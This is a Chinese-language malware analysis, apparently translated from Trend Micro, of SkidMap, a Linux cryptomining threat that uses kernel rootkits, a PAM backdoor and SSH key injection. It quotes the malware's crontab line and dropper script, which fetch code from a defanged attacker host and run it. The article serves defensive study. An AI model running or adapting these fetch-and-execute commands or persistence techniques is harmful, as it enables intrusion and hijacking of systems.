**挖掘加密货币恶意软件仍然是一个普遍的威胁。网络罪犯也越来越多地探索新的平台和方法来进一步利用挖矿恶意软件——从移动设备、Unix和类Unix系统到服务器和云环境。**

攻击者不断提升恶意软件抵御检测的能力。例如，将恶意软件与看门狗组件捆绑在一起，以确保非法的加密货币挖掘活动在受感染的机器中持续存在，或者基于Linux的系统，利用基于LD_PRELOAD-based的rootkit使其组件无法被系统检测到。

SkidMap是最近偶然发现的一个Linux恶意软件，它展示了最近加密货币挖掘威胁的日益复杂性。这个恶意软件之所以引人注目，是因为它加载恶意内核模块的方式，使其恶意行为不会被发现。

与用户模式的rootkit相比，这些内核模式的rootkit不仅更难检测，攻击者还可以使用它们获得对受影响系统的访问权限。skidmap还可以设置一个主密码，让它可以访问系统中的任何用户帐户。SkidMap的许多例程都需要根访问，SkidMap使用的攻击向量（无论是通过漏洞攻击、错误配置）很可能与向攻击者提供对系统的根访问或管理访问的攻击向量相同。

![](https://image.3001.net/images/20190918/1568792734_5d81e09e573d5.png!small)

## Skidmap感染链

恶意软件通过crontab将自身安装到目标计算机上，如下所示：

    
    
    */1 * * * * curl -fsSL hxxp://pm[.]ipfswallet[.]tk/pm.sh | sh

然后，安装脚本pm.sh下载主二进制文件“pc”：  

    
    
    if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
       wget -c hxxp://pm[.]ipfswallet[.]tk/pc -O /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc elif [ -x "/usr/bin/curl"  -o  -x "/bin/curl" ]; then
       curl -fs hxxp://pm[.]ipfswallet[.]tk/pc -o /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc elif [ -x "/usr/bin/get"  -o  -x "/bin/get" ]; then
       get -c hxxp://pm[.]ipfswallet[.]tk/pc -O /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc elif [ -x "/usr/bin/cur"  -o  -x "/bin/cur" ]; then
       cur -fs hxxp://pm[.]ipfswallet[.]tk/pc -o /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc else
       url -fs hxxp://pm[.]ipfswallet[.]tk/pc -o /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc fi  
    

执行“PC”二进制文件后，将更改削弱受影响机器的安全设置。如果文件/usr/sbin/setenforce存在，恶意软件执行命令setenforce
0。如果系统有/etc/selinux/config文件，它会将这些命令写入文件：selinux=disabled和selinux=targeted命令。前者禁用selinux策略（或不允许加载selinux策略），而后者将选定进程设置为在受限域中运行。

SkidMap还提供了后门，通过让二进制文件将其处理程序的公钥添加到authorized_keys文件来实现，该文件包含身份验证所需的密钥。

除了后门进入，SkidMap还为攻击者提供了另一种进入机器的方式。恶意软件用自己的恶意版本（检测为backdoor.linux.pamdor.a）替换系统的pam_unix.so文件（负责标准unix身份验证的模块）。如图2所示，此恶意pam_unix.so文件接受任何用户的特定密码，从而允许攻击者以计算机中的任何用户身份登录。

## SkidMap加密货币

“pc”二进制文件检查受感染系统的操作系统是debian还是rhel/centos。

对于基于debian的系统，它将cryptocurrency miner的有效负载降到/tmp/miner2。对于centos/rhel系统，它将从url
hxxp://pm[.]ipfswallet[.]tk/cos7[.]tar[.]gz下载一个tar文件，该文件包含cryptocurrency
miner及其多个组件，然后将其解压缩并安装。

![](https://image.3001.net/images/20190918/1568793520_5d81e3b05f3fb.png!small)

## SkidMap其他恶意组件

恶意软件组件旨在进一步混淆其恶意活动并确保它们继续运行：

1、一个伪“rm”二进制文件：tar文件中包含的一个组件是一个伪“rm”二进制文件，它将替换原始的文件（rm通常用作删除文件的命令）。此文件设置一个恶意cron作业，该作业将下载并执行一个文件。

2、kaudited，安装/usr/bin/kaudited文件。此二进制文件在受感染的计算机上安装多个可加载内核模块（LKM）。为了确保受感染的机器不会由于内核模式rootkits而崩溃，它对特定的内核版本使用不同的模块。kaudited二进制文件还删除了一个监视程序组件。

![](https://image.3001.net/images/20190918/1568793824_5d81e4e007ef6.png!small)

3、iproute，该模块钩住系统调用getdents（通常用于读取目录的内容）以隐藏特定的文件。

![](https://image.3001.net/images/20190918/1568793982_5d81e57e53356.png!small)

4、netlink，伪造网络流量和cpu相关的统计，使受感染机器的CPU负载始终看起来很低。

![](https://image.3001.net/images/20190918/1568794223_5d81e66f37a9f.png!small)

## 解决方案

SkidMap使用相当先进的方法来确保它及其组件不被发现。此外，SkidMap有多种方式访问受影响的机器，使其能够重新影响已恢复或清理的系统。

加密货币挖掘不仅影响服务器和工作站的性能，导致更高的开支，甚至扰乱业务。考虑到Linux在许多企业环境中的使用，用户和管理员应保持系统和服务器的更新和修补；谨防未经验证的第三方存储库；防止恶意文件或进程运行。

### IoCs

![](https://image.3001.net/images/20190918/1568794599_5d81e7e748b7e.png!small)

 ***参考来源：[trendmicro](https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/)，由Kriston编译，转载请注明来自FreeBuf.COM**

